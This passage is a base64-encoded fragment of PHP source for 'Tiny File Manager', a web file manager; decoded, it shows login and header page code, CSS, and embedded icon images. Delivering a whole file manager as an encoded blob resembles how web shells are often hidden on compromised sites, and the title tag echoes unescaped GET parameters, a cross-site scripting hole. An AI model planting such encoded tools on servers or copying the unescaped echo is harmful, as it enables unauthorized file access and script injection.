0KICAgICAgICAgICAgICAgIGNvbG9yOiBvcmFuZ2UNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgYm9keS5mbS1sb2dpbi1wYWdlLnRoZW1lLWRhcmsgew0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMyZjJhMmE7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC50aGVtZS1kYXJrIHN2ZyBnLA0KICAgICAgICAgICAgLnRoZW1lLWRhcmsgc3ZnIHBhdGggew0KICAgICAgICAgICAgICAgIGZpbGw6ICNmZmZmZmY7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC50aGVtZS1kYXJrIC5mb3JtLWNvbnRyb2wgew0KICAgICAgICAgICAgICAgIGNvbG9yOiAjZmZmOw0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICM0MDNlM2U7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5oLTEwMHZoIHsNCiAgICAgICAgICAgICAgICBtaW4taGVpZ2h0OiAxMDB2aDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgPC9zdHlsZT4NCiAgICA8L2hlYWQ+DQoNCiAgICA8Ym9keSBjbGFzcz0iZm0tbG9naW4tcGFnZSA8P3BocCBlY2hvIChGTV9USEVNRSA9PSAiZGFyayIpID8gJ3RoZW1lLWRhcmsnIDogJyc7ID8+Ij4NCiAgICAgICAgPGRpdiBpZD0id3JhcHBlciIgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+DQoNCiAgICAgICAgPD9waHANCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBTaG93IHBhZ2UgZm9vdGVyIGluIExvZ2luIEZvcm0NCiAgICAgKi8NCiAgICBmdW5jdGlvbiBmbV9zaG93X2Zvb3Rlcl9sb2dpbigpDQogICAgew0KICAgICAgICA/Pg0KICAgICAgICA8L2Rpdj4NCiAgICAgICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2pzLWpxdWVyeScpOyA/Pg0KICAgICAgICA8P3BocCBwcmludF9leHRlcm5hbCgnanMtYm9vdHN0cmFwJyk7ID8+DQogICAgPC9ib2R5Pg0KDQogICAgPC9odG1sPg0KDQo8P3BocA0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFNob3cgSGVhZGVyIGFmdGVyIGxvZ2luDQogICAgICovDQogICAgZnVuY3Rpb24gZm1fc2hvd19oZWFkZXIoKQ0KICAgIHsNCiAgICAgICAgaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIpOw0KICAgICAgICBoZWFkZXIoIkV4cGlyZXM6IFNhdCwgMjYgSnVsIDE5OTcgMDU6MDA6MDAgR01UIik7DQogICAgICAgIGhlYWRlcigiQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUsIHBvc3QtY2hlY2s9MCwgcHJlLWNoZWNrPTAiKTsNCiAgICAgICAgaGVhZGVyKCJQcmFnbWE6IG5vLWNhY2hlIik7DQoNCiAgICAgICAgZ2xvYmFsICRzdGlja3lfbmF2YmFyLCAkZmF2aWNvbl9wYXRoOw0KICAgICAgICAkaXNTdGlja3lOYXZCYXIgPSAkc3RpY2t5X25hdmJhciA/ICduYXZiYXItZml4ZWQnIDogJ25hdmJhci1ub3JtYWwnOw0KPz4NCiAgICA8IURPQ1RZUEUgaHRtbD4NCiAgICA8aHRtbCBkYXRhLWJzLXRoZW1lPSI8P3BocCBlY2hvIEZNX1RIRU1FOyA/PiI+DQoNCiAgICA8aGVhZD4NCiAgICAgICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPg0KICAgICAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPg0KICAgICAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iV2ViIGJhc2VkIEZpbGUgTWFuYWdlciBpbiBQSFAsIE1hbmFnZSB5b3VyIGZpbGVzIGVmZmljaWVudGx5IGFuZCBlYXNpbHkgd2l0aCBUaW55IEZpbGUgTWFuYWdlciI+DQogICAgICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iQ0NQIFByb2dyYW1tZXJzIj4NCiAgICAgICAgPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJub2luZGV4LCBub2ZvbGxvdyI+DQogICAgICAgIDxtZXRhIG5hbWU9Imdvb2dsZWJvdCIgY29udGVudD0ibm9pbmRleCI+DQogICAgICAgIDw/cGhwIGlmICgkZmF2aWNvbl9wYXRoKSB7DQogICAgICAgICAgICBlY2hvICc8bGluayByZWw9Imljb24iIGhyZWY9IicgLiBmbV9lbmMoJGZhdmljb25fcGF0aCkgLiAnIiB0eXBlPSJpbWFnZS9wbmciPic7DQogICAgICAgIH0gPz4NCiAgICAgICAgPHRpdGxlPjw/cGhwIGVjaG8gZm1fZW5jKEFQUF9USVRMRSkgPz4gfCA8P3BocCBlY2hvIChpc3NldCgkX0dFVFsndmlldyddKSA/ICRfR0VUWyd2aWV3J10gOiAoKGlzc2V0KCRfR0VUWydlZGl0J10pKSA/ICRfR0VUWydlZGl0J10gOiAiSDNLIikpOyA/PjwvdGl0bGU+DQogICAgICAgIDw/cGhwIHByaW50X2V4dGVybmFsKCdwcmUtanNkZWxpdnInKTsgPz4NCiAgICAgICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ3ByZS1jbG91ZGZsYXJlJyk7ID8+DQogICAgICAgIDw/cGhwIHByaW50X2V4dGVybmFsKCdjc3MtYm9vdHN0cmFwJyk7ID8+DQogICAgICAgIDw/cGhwIHByaW50X2V4dGVybmFsKCdjc3MtZm9udC1hd2Vzb21lJyk7ID8+DQogICAgICAgIDw/cGhwIGlmIChGTV9VU0VfSElHSExJR0hUSlMgJiYgaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpOiA/Pg0KICAgICAgICAgICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2Nzcy1oaWdobGlnaHRqcycpOyA/Pg0KICAgICAgICA8P3BocCBlbmRpZjsgPz4NCiAgICAgICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KICAgICAgICAgICAgd2luZG93LmNzcmYgPSAnPD9waHAgZWNobyAkX1NFU1NJT05bJ3Rva2VuJ107ID8+JzsNCiAgICAgICAgPC9zY3JpcHQ+DQogICAgICAgIDxzdHlsZT4NCiAgICAgICAgICAgIGh0bWwgew0KICAgICAgICAgICAgICAgIC1tb3otb3N4LWZvbnQtc21vb3RoaW5nOiBncmF5c2NhbGU7DQogICAgICAgICAgICAgICAgLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7DQogICAgICAgICAgICAgICAgdGV4dC1yZW5kZXJpbmc6IG9wdGltaXplTGVnaWJpbGl0eTsNCiAgICAgICAgICAgICAgICBoZWlnaHQ6IDEwMCU7DQogICAgICAgICAgICAgICAgc2Nyb2xsLWJlaGF2aW9yOiBzbW9vdGg7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICosDQogICAgICAgICAgICAqOjpiZWZvcmUsDQogICAgICAgICAgICAqOjphZnRlciB7DQogICAgICAgICAgICAgICAgYm94LXNpemluZzogYm9yZGVyLWJveDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgYm9keSB7DQogICAgICAgICAgICAgICAgZm9udC1zaXplOiAxNXB4Ow0KICAgICAgICAgICAgICAgIGNvbG9yOiAjMjIyOw0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICNGN0Y3Rjc7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGJvZHkubmF2YmFyLWZpeGVkIHsNCiAgICAgICAgICAgICAgICBtYXJnaW4tdG9wOiA1NXB4Ow0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBhLA0KICAgICAgICAgICAgYTpob3ZlciwNCiAgICAgICAgICAgIGE6dmlzaXRlZCwNCiAgICAgICAgICAgIGE6Zm9jdXMgew0KICAgICAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZSAhaW1wb3J0YW50Ow0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZmlsZW5hbWUsDQogICAgICAgICAgICB0ZCwNCiAgICAgICAgICAgIHRoIHsNCiAgICAgICAgICAgICAgICB3aGl0ZS1zcGFjZTogbm93cmFwDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5uYXZiYXItYnJhbmQgew0KICAgICAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAubmF2LWl0ZW0uYXZhdGFyIGEgew0KICAgICAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICAgICAgICAgICAgICB0ZXh0LXRyYW5zZm9ybTogY2FwaXRhbGl6ZTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLm5hdi1pdGVtLmF2YXRhciBhPmkgew0KICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMTVweDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLm5hdi1pdGVtLmF2YXRhciAuZHJvcGRvd24tbWVudSBhIHsNCiAgICAgICAgICAgICAgICBmb250LXNpemU6IDEzcHg7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICNzZWFyY2gtYWRkb24gew0KICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMTJweDsNCiAgICAgICAgICAgICAgICBib3JkZXItcmlnaHQtd2lkdGg6IDA7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5icmwtMCB7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7DQogICAgICAgICAgICAgICAgYm9yZGVyLWxlZnQ6IDA7DQogICAgICAgICAgICAgICAgYm9yZGVyLXRvcC1sZWZ0LXJhZGl1czogMDsNCiAgICAgICAgICAgICAgICBib3JkZXItYm90dG9tLWxlZnQtcmFkaXVzOiAwOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuYnJyLTAgew0KICAgICAgICAgICAgICAgIGJvcmRlci10b3AtcmlnaHQtcmFkaXVzOiAwOw0KICAgICAgICAgICAgICAgIGJvcmRlci1ib3R0b20tcmlnaHQtcmFkaXVzOiAwOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuYnJlYWQtY3J1bWIgew0KICAgICAgICAgICAgICAgIGNvbG9yOiAjY2NjY2NjOw0KICAgICAgICAgICAgICAgIGZvbnQtc3R5bGU6IG5vcm1hbDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgI21haW4tdGFibGUgew0KICAgICAgICAgICAgICAgIHRyYW5zaXRpb246IHRyYW5zZm9ybSAuMjVzIGN1YmljLWJlemllcigwLjQsIDAuNSwgMCwgMSksIHdpZHRoIDBzIC4yNXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICNtYWluLXRhYmxlIC5maWxlbmFtZSBhIHsNCiAgICAgICAgICAgICAgICBjb2xvcjogIzIyMjIyMjsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLnRhYmxlIHRkLA0KICAgICAgICAgICAgLnRhYmxlIHRoIHsNCiAgICAgICAgICAgICAgICB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlICFpbXBvcnRhbnQ7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC50YWJsZSAuY3VzdG9tLWNoZWNrYm94LXRkIC5jdXN0b20tY29udHJvbC5jdXN0b20tY2hlY2tib3gsDQogICAgICAgICAgICAudGFibGUgLmN1c3RvbS1jaGVja2JveC1oZWFkZXIgLmN1c3RvbS1jb250cm9sLmN1c3RvbS1jaGVja2JveCB7DQogICAgICAgICAgICAgICAgbWluLXdpZHRoOiAxOHB4Ow0KICAgICAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7DQogICAgICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAgICAgICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLnRhYmxlLXNtIHRkLA0KICAgICAgICAgICAgLnRhYmxlLXNtIHRoIHsNCiAgICAgICAgICAgICAgICBwYWRkaW5nOiAuNHJlbTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLnRhYmxlLWJvcmRlcmVkIHRkLA0KICAgICAgICAgICAgLnRhYmxlLWJvcmRlcmVkIHRoIHsNCiAgICAgICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjZjFmMWYxOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuaGlkZGVuIHsNCiAgICAgICAgICAgICAgICBkaXNwbGF5OiBub25lDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHByZS53aXRoLWhsanMgew0KICAgICAgICAgICAgICAgIHBhZGRpbmc6IDA7DQogICAgICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHJlLndpdGgtaGxqcyBjb2RlIHsNCiAgICAgICAgICAgICAgICBtYXJnaW46IDA7DQogICAgICAgICAgICAgICAgYm9yZGVyOiAwOw0KICAgICAgICAgICAgICAgIG92ZXJmbG93OiBzY3JvbGw7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGNvZGUubWF4aGVpZ2h0LA0KICAgICAgICAgICAgcHJlLm1heGhlaWdodCB7DQogICAgICAgICAgICAgICAgbWF4LWhlaWdodDogNTEycHgNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLmZhLmZhLWNhcmV0LXJpZ2h0IHsNCiAgICAgICAgICAgICAgICBmb250LXNpemU6IDEuMmVtOw0KICAgICAgICAgICAgICAgIG1hcmdpbjogMCA0cHg7DQogICAgICAgICAgICAgICAgdmVydGljYWwtYWxpZ246IG1pZGRsZTsNCiAgICAgICAgICAgICAgICBjb2xvcjogI2VjZWNlYw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZmEuZmEtaG9tZSB7DQogICAgICAgICAgICAgICAgZm9udC1zaXplOiAxLjNlbTsNCiAgICAgICAgICAgICAgICB2ZXJ0aWNhbC1hbGlnbjogYm90dG9tDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5wYXRoIHsNCiAgICAgICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGZvcm0uZHJvcHpvbmUgew0KICAgICAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDIwMHB4Ow0KICAgICAgICAgICAgICAgIGJvcmRlcjogMnB4IGRhc2hlZCAjMDA3YmZmOw0KICAgICAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiA2cmVtOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAucmlnaHQgew0KICAgICAgICAgICAgICAgIHRleHQtYWxpZ246IHJpZ2h0DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5jZW50ZXIsDQogICAgICAgICAgICAuY2xvc2UsDQogICAgICAgICAgICAubG9naW4tZm9ybSwNCiAgICAgICAgICAgIC5wcmV2aWV3LWltZy1jb250YWluZXIgew0KICAgICAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAubWVzc2FnZSB7DQogICAgICAgICAgICAgICAgcGFkZGluZzogNHB4IDdweDsNCiAgICAgICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjZGRkOw0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmZmYNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLm1lc3NhZ2Uub2sgew0KICAgICAgICAgICAgICAgIGJvcmRlci1jb2xvcjogZ3JlZW47DQogICAgICAgICAgICAgICAgY29sb3I6IGdyZWVuDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5tZXNzYWdlLmVycm9yIHsNCiAgICAgICAgICAgICAgICBib3JkZXItY29sb3I6IHJlZDsNCiAgICAgICAgICAgICAgICBjb2xvcjogcmVkDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5tZXNzYWdlLmFsZXJ0IHsNCiAgICAgICAgICAgICAgICBib3JkZXItY29sb3I6IG9yYW5nZTsNCiAgICAgICAgICAgICAgICBjb2xvcjogb3JhbmdlDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5wcmV2aWV3LWltZyB7DQogICAgICAgICAgICAgICAgbWF4LXdpZHRoOiAxMDAlOw0KICAgICAgICAgICAgICAgIG1heC1oZWlnaHQ6IDgwdmg7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogdXJsKGRhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQkFBQUFBUUNBSUFBQUNRa1dnMkFBQUFLa2xFUVZSNDJtTDUvLzgvQXpidytQRmpyT0pNRENTQ1VRM0VBQlpjNFMwckt6c2FTdlRUQUJCZ0FNeWZDTXNZNEI5aUFBQUFBRWxGVGtTdVFtQ0MpOw0KICAgICAgICAgICAgICAgIGN1cnNvcjogem9vbS1pbg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpbnB1dCNwcmV2aWV3LWltZy16b29tQ2hlY2tbdHlwZT1jaGVja2JveF0gew0KICAgICAgICAgICAgICAgIGRpc3BsYXk6IG5vbmUNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaW5wdXQjcHJldmlldy1pbWctem9vbUNoZWNrW3R5cGU9Y2hlY2tib3hdOmNoZWNrZWR+bGFiZWw+aW1nIHsNCiAgICAgICAgICAgICAgICBtYXgtd2lkdGg6IG5vbmU7DQogICAgICAgICAgICAgICAgbWF4LWhlaWdodDogbm9uZTsNCiAgICAgICAgICAgICAgICBjdXJzb3I6IHpvb20tb3V0DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5pbmxpbmUtYWN0aW9ucz5hPmkgew0KICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMWVtOw0KICAgICAgICAgICAgICAgIG1hcmdpbi1sZWZ0OiA1cHg7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzM3ODVjMTsNCiAgICAgICAgICAgICAgICBjb2xvcjogI2ZmZjsNCiAgICAgICAgICAgICAgICBwYWRkaW5nOiAzcHggNHB4Ow0KICAgICAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDNweDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLnByZXZpZXctdmlkZW8gew0KICAgICAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsNCiAgICAgICAgICAgICAgICBtYXgtd2lkdGg6IDEwMCU7DQogICAgICAgICAgICAgICAgaGVpZ2h0OiAwOw0KICAgICAgICAgICAgICAgIHBhZGRpbmctYm90dG9tOiA2Mi41JTsNCiAgICAgICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5wcmV2aWV3LXZpZGVvIHZpZGVvIHsNCiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCU7DQogICAgICAgICAgICAgICAgaGVpZ2h0OiAxMDAlOw0KICAgICAgICAgICAgICAgIGxlZnQ6IDA7DQogICAgICAgICAgICAgICAgdG9wOiAwOw0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwMDANCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLmNvbXBhY3QtdGFibGUgew0KICAgICAgICAgICAgICAgIGJvcmRlcjogMDsNCiAgICAgICAgICAgICAgICB3aWR0aDogYXV0bw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuY29tcGFjdC10YWJsZSB0ZCwNCiAgICAgICAgICAgIC5jb21wYWN0LXRhYmxlIHRoIHsNCiAgICAgICAgICAgICAgICB3aWR0aDogMTAwcHg7DQogICAgICAgICAgICAgICAgYm9yZGVyOiAwOw0KICAgICAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuY29tcGFjdC10YWJsZSB0cjpob3ZlciB0ZCB7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZmlsZW5hbWUgew0KICAgICAgICAgICAgICAgIG1heC13aWR0aDogNDIwcHg7DQogICAgICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICAgICAgICAgICAgICB0ZXh0LW92ZXJmbG93OiBlbGxpcHNpcw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuYnJlYWstd29yZCB7DQogICAgICAgICAgICAgICAgd29yZC13cmFwOiBicmVhay13b3JkOw0KICAgICAgICAgICAgICAgIG1hcmdpbi1sZWZ0OiAzMHB4DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5icmVhay13b3JkLmZsb2F0LWxlZnQgYSB7DQogICAgICAgICAgICAgICAgY29sb3I6ICM3ZDdkN2QNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLmJyZWFrLXdvcmQrLmZsb2F0LXJpZ2h0IHsNCiAgICAgICAgICAgICAgICBwYWRkaW5nLXJpZ2h0OiAzMHB4Ow0KICAgICAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuYnJlYWstd29yZCsuZmxvYXQtcmlnaHQ+YSB7DQogICAgICAgICAgICAgICAgY29sb3I6ICM3ZDdkN2Q7DQogICAgICAgICAgICAgICAgZm9udC1zaXplOiAxLjJlbTsNCiAgICAgICAgICAgICAgICBtYXJnaW4tcmlnaHQ6IDRweA0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAjZWRpdG9yIHsNCiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgICAgICAgICAgICAgcmlnaHQ6IDE1cHg7DQogICAgICAgICAgICAgICAgdG9wOiAxMDBweDsNCiAgICAgICAgICAgICAgICBib3R0b206IDE1cHg7DQogICAgICAgICAgICAgICAgbGVmdDogMTVweA0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBAbWVkaWEgKG1heC13aWR0aDo0ODFweCkgew0KICAgICAgICAgICAgICAgICNlZGl0b3Igew0KICAgICAgICAgICAgICAgICAgICB0b3A6IDE1MHB4Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgI25vcm1hbC1lZGl0b3Igew0KICAgICAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDNweDsNCiAgICAgICAgICAgICAgICBib3JkZXItd2lkdGg6IDJweDsNCiAgICAgICAgICAgICAgICBwYWRkaW5nOiAxMHB4Ow0KICAgICAgICAgICAgICAgIG91dGxpbmU6IG5vbmU7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5idG4tMiB7DQogICAgICAgICAgICAgICAgcGFkZGluZzogNHB4IDEwcHg7DQogICAgICAgICAgICAgICAgZm9udC1zaXplOiBzbWFsbDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgbGkuZmlsZTpiZWZvcmUsDQogICAgICAgICAgICBsaS5mb2xkZXI6YmVmb3JlIHsNCiAgICAgICAgICAgICAgICBmb250OiBub3JtYWwgbm9ybWFsIG5vcm1hbCAxNHB4LzEgRm9udEF3ZXNvbWU7DQogICAgICAgICAgICAgICAgY29udGVudDogIlxmMDE2IjsNCiAgICAgICAgICAgICAgICBtYXJnaW4tcmlnaHQ6IDVweA0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBsaS5mb2xkZXI6YmVmb3JlIHsNCiAgICAgICAgICAgICAgICBjb250ZW50OiAiXGYxMTQiDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGkuZmEuZmEtZm9sZGVyLW8gew0KICAgICAgICAgICAgICAgIGNvbG9yOiAjMDE1N2IzDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGkuZmEuZmEtcGljdHVyZS1vIHsNCiAgICAgICAgICAgICAgICBjb2xvcjogIzI2Yjk5YQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpLmZhLmZhLWZpbGUtYXJjaGl2ZS1vIHsNCiAgICAgICAgICAgICAgICBjb2xvcjogI2RhN2Q3ZA0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuYnRuLTIgaS5mYS5mYS1maWxlLWFyY2hpdmUtbyB7DQogICAgICAgICAgICAgICAgY29sb3I6IGluaGVyaXQNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaS5mYS5mYS1jc3MzIHsNCiAgICAgICAgICAgICAgICBjb2xvcjogI2YzNmZhMA0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpLmZhLmZhLWZpbGUtY29kZS1vIHsNCiAgICAgICAgICAgICAgICBjb2xvcjogIzAwN2JmZg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpLmZhLmZhLWNvZGUgew0KICAgICAgICAgICAgICAgIGNvbG9yOiAjY2M0YjRjDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGkuZmEuZmEtZmlsZS10ZXh0LW8gew0KICAgICAgICAgICAgICAgIGNvbG9yOiAjMDA5NmU2DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGkuZmEuZmEtaHRtbDUgew0KICAgICAgICAgICAgICAgIGNvbG9yOiAjZDc1ZTcyDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGkuZmEuZmEtZmlsZS1leGNlbC1vIHsNCiAgICAgICAgICAgICAgICBjb2xvcjogIzA5YzU1ZA0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpLmZhLmZhLWZpbGUtcG93ZXJwb2ludC1vIHsNCiAgICAgICAgICAgICAgICBjb2xvcjogI2Y2NzEyZQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpLmdvLWJhY2sgew0KICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4yZW07DQogICAgICAgICAgICAgICAgY29sb3I6ICMwMDdiZmY7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5tYWluLW5hdiB7DQogICAgICAgICAgICAgICAgcGFkZGluZzogMC4ycmVtIDFyZW07DQogICAgICAgICAgICAgICAgYm94LXNoYWRvdzogMCA0cHggNXB4IDAgcmdiYSgwLCAwLCAwLCAuMTQpLCAwIDFweCAxMHB4IDAgcmdiYSgwLCAwLCAwLCAuMTIpLCAwIDJweCA0cHggLTFweCByZ2JhKDAsIDAsIDAsIC4yKQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZGF0YVRhYmxlc19maWx0ZXIgew0KICAgICAgICAgICAgICAgIGRpc3BsYXk6IG5vbmU7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHRhYmxlLmRhdGFUYWJsZSB0aGVhZCAuc29ydGluZyB7DQogICAgICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOw0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyIHJpZ2h0Ow0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgnZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCTUFBQUFUQ0FRQUFBRFlXZjVIQUFBQWtFbEVRVlFvejdYUU1RNUFRQkNGNGRXUVNKeEM1d3dheDFDcTFlN0JBZHhENVNMK1RxL1FDTTFvTmlKaWR3b3gwMzU1bVhuRy9EckV0SVE2YXppb05aUXhJMHlrUGhUUUl3aENSK0JtQll0bEs3a0xKWXdXQ2NKQTlNNHFkclpyZDhwUGpaV1B0T3FkUlF5MzIwWVNWMTdPYXRGQzRldXRzNnozOUdZTUtSUENUS1k5VW5QUTZQK0d0TVJmR3RQbkJDaXFoQWVKUG1rcUFBQUFBRWxGVGtTdVFtQ0MnKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgdGFibGUuZGF0YVRhYmxlIHRoZWFkIC5zb3J0aW5nX2FzYyB7DQogICAgICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOw0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyIHJpZ2h0Ow0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgnZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCTUFBQUFUQ0FZQUFBQnlVRGJNQUFBQVowbEVRVlE0eTJOZ0dMS2dxdUV1RnhCUEFHSTJhaGhXQ3NTL2dEaWJVb08wZ1BneEVQOEg0dHRBckV5dVFZeEFQQmRxRUF4